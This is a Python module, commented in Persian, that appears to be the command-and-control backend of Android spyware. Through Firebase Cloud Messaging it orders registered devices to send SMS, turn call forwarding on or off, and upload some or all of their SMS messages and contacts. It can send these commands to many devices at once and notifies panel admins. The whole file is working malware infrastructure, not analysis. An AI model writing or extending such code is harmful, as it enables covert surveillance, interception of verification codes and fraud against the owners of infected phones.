import firebase_admin
from firebase_admin import credentials, messaging
from typing import List, Dict, Any, Optional
import logging
from ..database import mongodb
from datetime import datetime

logger = logging.getLogger(__name__)

class FirebaseService:

    def __init__(self, service_account_file: str):
        try:
            if not firebase_admin._apps:
                cred = credentials.Certificate(service_account_file)
                firebase_admin.initialize_app(cred)
            logger.info("✅ Firebase initialized")
        except Exception as e:
            logger.error(f"❌ Firebase initialization error: {e}")

    async def _send_command(self, token: str, data: Dict[str, str], device_id: Optional[str] = None) -> Optional[str]:
        """ارسال دستور به دستگاه با FCM"""
        try:
            message = messaging.Message(
                data=data,
                token=token,
            )

            response = messaging.send(message)
            logger.info(f"✅ Command sent to {device_id or 'device'}: {data.get('type', 'unknown')}")
            logger.info(f"📨 Message ID: {response}")

            return response

        except messaging.UnregisteredError:
            logger.warning(f"⚠️ Invalid FCM token for device: {device_id}")

            if device_id:
                await self._remove_invalid_token(device_id, token)
            return None

        except Exception as e:
            logger.error(f"❌ Error sending command to {device_id or 'device'}: {e}")
            return None

    async def _send_ping(self, token: str, device_id: Optional[str] = None) -> bool:
        """ارسال Ping به دستگاه"""
        response = await self._send_command(
            token,
            {
                "type": "ping",
                "timestamp": str(int(datetime.utcnow().timestamp() * 1000))
            },
            device_id
        )
        return response is not None

    async def _remove_invalid_token(self, device_id: str, token: str):
        """حذف توکن نامعتبر از دیتابیس"""
        try:
            await mongodb.db.devices.update_one(
                {"device_id": device_id},
                {"$pull": {"fcm_tokens": token}}
            )
            logger.info(f"🗑️ Removed invalid token from device: {device_id}")
        except Exception as e:
            logger.error(f"❌ Error removing invalid token: {e}")

    async def get_all_device_tokens(self) -> List[Dict[str, Any]]:
        """دریافت تمام دستگاه‌ها با FCM Token"""
        try:
            devices = await mongodb.db.devices.find(
                {"fcm_tokens": {"$exists": True, "$ne": []}},
                {"device_id": 1, "fcm_tokens": 1, "model": 1, "manufacturer": 1}
            ).to_list(length=None)

            logger.info(f"📱 Found {len(devices)} devices with FCM tokens")
            return devices

        except Exception as e:
            logger.error(f"❌ Error getting device tokens: {e}")
            return []

    async def ping_all_devices(self) -> Dict[str, Any]:
        """ارسال Ping به تمام دستگاه‌ها"""
        devices = await self.get_all_device_tokens()

        results = {
            "total_devices": len(devices),
            "total_tokens": 0,
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device in devices:
            device_id = device.get("device_id")
            tokens = device.get("fcm_tokens", [])

            results["total_tokens"] += len(tokens)

            device_result = {
                "device_id": device_id,
                "model": device.get("model", "Unknown"),
                "manufacturer": device.get("manufacturer", "Unknown"),
                "tokens_count": len(tokens),
                "sent": []
            }

            for token in tokens:
                success = await self._send_ping(token, device_id)

                if success:
                    results["success"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "success"
                    })
                else:
                    results["failed"] += 1
                    device_result["sent"].append({
                        "token": token[:20] + "...",
                        "status": "failed"
                    })

            results["details"].append(device_result)

        logger.info(f"📊 Ping summary: {results['success']}/{results['total_tokens']} successful")
        return results

    async def send_command_to_device(
        self,
        device_id: str,
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """ارسال دستور عمومی به دستگاه"""
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1}
            )

            if not device or not device.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": "Device not found or no FCM tokens available"
                }

            tokens = device.get("fcm_tokens", [])

            data = {
                "type": command_type,
                "timestamp": str(int(datetime.utcnow().timestamp() * 1000))
            }

            if parameters:
                for key, value in parameters.items():
                    data[key] = str(value)

            success_count = 0
            for token in tokens:
                response = await self._send_command(token, data, device_id)
                if response:
                    success_count += 1

            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Command sent to {success_count}/{len(tokens)} tokens"
            }

        except Exception as e:
            logger.error(f"❌ Error sending command to device {device_id}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    # ⭐⭐⭐ توابع جدید برای دستورات مختلف ⭐⭐⭐

    async def send_sms(
        self,
        device_id: str,
        phone: str,
        message: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        """ارسال پیامک از دستگاه"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="send_sms",
            parameters={
                "phone": phone,
                "message": message,
                "simSlot": sim_slot
            }
        )

    async def enable_call_forwarding(
        self,
        device_id: str,
        forward_number: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        """فعال‌سازی هدایت تماس"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding",
            parameters={
                "number": forward_number,
                "simSlot": sim_slot
            }
        )

    async def disable_call_forwarding(
        self,
        device_id: str,
        sim_slot: int = 0
    ) -> Dict[str, Any]:
        """غیرفعال‌سازی هدایت تماس"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="call_forwarding_disable",
            parameters={
                "simSlot": sim_slot
            }
        )

    async def quick_upload_sms(self, device_id: str) -> Dict[str, Any]:
        """آپلود سریع 50 پیامک"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_sms"
        )

    async def quick_upload_contacts(self, device_id: str) -> Dict[str, Any]:
        """آپلود سریع 50 مخاطب"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="quick_upload_contacts"
        )

    async def upload_all_sms(self, device_id: str) -> Dict[str, Any]:
        """آپلود کامل همه پیامک‌ها"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_sms"
        )

    async def upload_all_contacts(self, device_id: str) -> Dict[str, Any]:
        """آپلود کامل همه مخاطبین"""
        return await self.send_command_to_device(
            device_id=device_id,
            command_type="upload_all_contacts"
        )

    async def ping_device(self, device_id: str) -> Dict[str, Any]:
        """ارسال Ping به یک دستگاه خاص"""
        try:
            device = await mongodb.db.devices.find_one(
                {"device_id": device_id},
                {"fcm_tokens": 1}
            )

            if not device or not device.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": "Device not found or no FCM tokens"
                }

            tokens = device.get("fcm_tokens", [])
            success_count = 0

            for token in tokens:
                success = await self._send_ping(token, device_id)
                if success:
                    success_count += 1

            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Ping sent to {success_count}/{len(tokens)} tokens"
            }

        except Exception as e:
            logger.error(f"❌ Error pinging device {device_id}: {e}")
            return {
                "success": False,
                "message": str(e)
            }

    # ⭐ تابع کمکی برای ارسال دستور به چند دستگاه
    async def send_command_to_multiple_devices(
        self,
        device_ids: List[str],
        command_type: str,
        parameters: Optional[Dict[str, Any]] = None
    ) -> Dict[str, Any]:
        """ارسال دستور به چندین دستگاه همزمان"""
        results = {
            "total": len(device_ids),
            "success": 0,
            "failed": 0,
            "details": []
        }

        for device_id in device_ids:
            result = await self.send_command_to_device(
                device_id=device_id,
                command_type=command_type,
                parameters=parameters
            )

            if result["success"]:
                results["success"] += 1
            else:
                results["failed"] += 1

            results["details"].append({
                "device_id": device_id,
                "status": "success" if result["success"] else "failed",
                "message": result.get("message", "")
            })

        logger.info(f"📊 Batch command: {results['success']}/{results['total']} successful")
        return results
    
    # ⭐ Push Notifications برای ادمین‌ها ⭐
    
    async def send_notification_to_admin(
        self,
        admin_username: str,
        title: str,
        body: str,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """ارسال push notification به یک ادمین خاص"""
        try:
            # دریافت FCM tokens ادمین
            admin = await mongodb.db.admins.find_one(
                {"username": admin_username},
                {"fcm_tokens": 1}
            )
            
            if not admin or not admin.get("fcm_tokens"):
                return {
                    "success": False,
                    "message": f"No FCM tokens found for admin: {admin_username}"
                }
            
            tokens = admin.get("fcm_tokens", [])
            success_count = 0
            
            # ساخت پیام notification
            notification = messaging.Notification(
                title=title,
                body=body
            )
            
            # ارسال به همه توکن‌های ادمین
            for token in tokens:
                try:
                    message = messaging.Message(
                        notification=notification,
                        data=data or {},
                        token=token
                    )
                    
                    response = messaging.send(message)
                    success_count += 1
                    logger.info(f"📱 Notification sent to {admin_username}: {response}")
                    
                except messaging.UnregisteredError:
                    logger.warning(f"⚠️ Invalid FCM token for admin: {admin_username}")
                    # حذف توکن نامعتبر
                    await mongodb.db.admins.update_one(
                        {"username": admin_username},
                        {"$pull": {"fcm_tokens": token}}
                    )
                    
                except Exception as e:
                    logger.error(f"❌ Error sending notification to {admin_username}: {e}")
            
            return {
                "success": success_count > 0,
                "sent_count": success_count,
                "total_tokens": len(tokens),
                "message": f"Notification sent to {success_count}/{len(tokens)} tokens"
            }
            
        except Exception as e:
            logger.error(f"❌ Error sending notification to admin {admin_username}: {e}")
            return {
                "success": False,
                "message": str(e)
            }
    
    async def send_notification_to_all_admins(
        self,
        title: str,
        body: str,
        data: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """ارسال push notification به همه ادمین‌ها"""
        try:
            # دریافت همه ادمین‌های فعال با FCM token
            admins = await mongodb.db.admins.find(
                {
                    "is_active": True,
                    "fcm_tokens": {"$exists": True, "$ne": []}
                },
                {"username": 1, "fcm_tokens": 1}
            ).to_list(length=None)
            
            results = {
                "total_admins": len(admins),
                "success": 0,
                "failed": 0,
                "details": []
            }
            
            for admin in admins:
                admin_username = admin.get("username")
                result = await self.send_notification_to_admin(
                    admin_username=admin_username,
                    title=title,
                    body=body,
                    data=data
                )
                
                if result["success"]:
                    results["success"] += 1
                else:
                    results["failed"] += 1
                
                results["details"].append({
                    "admin": admin_username,
                    "status": "success" if result["success"] else "failed",
                    "sent_count": result.get("sent_count", 0)
                })
            
            logger.info(f"📊 Notification summary: {results['success']}/{results['total_admins']} admins notified")
            return results
            
        except Exception as e:
            logger.error(f"❌ Error sending notifications to admins: {e}")
            return {
                "success": False,
                "message": str(e)
            }


firebase_service = FirebaseService("testkot-d12cc-firebase-adminsdk-fbsvc-523c1700f0.json")